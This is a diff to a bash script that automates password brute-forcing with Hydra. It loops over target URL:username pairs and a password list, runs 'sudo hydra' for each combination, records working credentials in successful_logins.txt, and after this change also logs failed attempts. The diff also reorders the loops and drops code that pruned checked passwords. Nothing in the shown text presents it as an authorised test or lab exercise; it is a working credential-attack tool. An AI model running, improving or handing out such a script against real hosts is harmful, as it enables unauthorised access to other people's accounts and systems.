@@ -4,6 +4,7 @@
 iplog_file="iplog.txt"
 passwords_file="passwords.txt"
 success_log_file="successful_logins.txt"
+error_log_file="error_log.txt"
 
 # Check if the input files exist
 if [[ ! -f "$iplog_file" || ! -f "$passwords_file" ]]; then
@@ -11,8 +12,9 @@ if [[ ! -f "$iplog_file" || ! -f "$passwords_file" ]]; then
     exit 1
 fi
 
-# Create or clear the success log file
+# Create or clear the log files
 > "$success_log_file"
+> "$error_log_file"
 
 # Read all IP:username pairs into an array, filter out empty lines
 mapfile -t iplog_entries < <(grep -v '^$' "$iplog_file")
@@ -24,9 +26,6 @@ total_attempts=$(( ${#iplog_entries[@]} * ${#passwords[@]} ))
 current_attempt=0
 successful_attempts=0
 start_time=$(date +%s)
-
-# Create a temporary file to store remaining passwords
-temp_passwords_file=$(mktemp)
 
 # Function to display progress
 display_progress() {
@@ -43,7 +42,7 @@ display_progress() {
     tput clear
     echo "Total Attempts: $total_attempts"
     echo "Progress: $current_attempt / $total_attempts ($percent%)"
-    echo "Checking password '$current_password' for host '$current_host'"
+    echo "Currently checking password: '$current_password' for host: '$current_host'"
     echo "Successful logins: $successful_attempts"
     echo "Time elapsed: $(date -u -d @$elapsed_time +%H:%M:%S)"
     if (( current_attempt > 0 )); then
@@ -54,22 +53,24 @@ display_progress() {
 # Print initial UI
 echo "Attempting logins..."
 
-# Loop through each password
-for password in "${passwords[@]}"; do
-    # Ensure the password is not empty
-    if [[ -z "$password" ]]; then continue; fi
+# Loop through each entry in iplog.txt
+for entry in "${iplog_entries[@]}"; do
+    IFS=: read -r full_url target_name <<< "$entry"
+    
+    # Check if the full_url and target_name are not empty
+    if [[ -z "$full_url" || -z "$target_name" ]]; then continue; fi
 
-    # Loop through each entry in iplog.txt for the current password
-    for entry in "${iplog_entries[@]}"; do
-        IFS=: read -r full_url target_name <<< "$entry"
-        
-        # Check if the full_url and target_name are not empty
-        if [[ -z "$full_url" || -z "$target_name" ]]; then continue; fi
+    # Loop through each password
+    for password in "${passwords[@]}"; do
+        # Ensure the password is not empty
+        if [[ -z "$password" ]]; then continue; fi
 
         # Run Hydra for each username and password pair, capturing output
         if sudo hydra -l "$target_name" -p "$password" "$full_url" -t 5 -W 4 | grep -q "login successful"; then
             echo "Successful login with $target_name on $full_url using password: $password" >> "$success_log_file"
             successful_attempts=$((successful_attempts + 1))
+        else
+            echo "Failed login attempt for $target_name on $full_url using password: $password" >> "$error_log_file"
         fi
 
         # Update current attempt count
@@ -81,19 +82,10 @@ for password in "${passwords[@]}"; do
         # Display progress
         display_progress "$elapsed_time" "$current_attempt" "$total_attempts" "$successful_attempts" "$password" "$full_url"
     done
-
-    # Write the password to the temp file (it's been checked)
-    echo "$password" >> "$temp_passwords_file"
-
-    # Remove checked passwords from the original file
-    grep -vF "$password" "$passwords_file" > "${passwords_file}.new"
-    mv "${passwords_file}.new" "$passwords_file"
 done
 
-# Clean up the temporary file
-rm "$temp_passwords_file"
-
 # Final output
+elapsed_time=$(( $(date +%s) - start_time ))
 echo "Completed processing all entries in $iplog_file."
 echo "Successful Logins: $(wc -l < $success_log_file)"
 echo "Time Used: $(date -u -d @$elapsed_time +%H:%M:%S)"
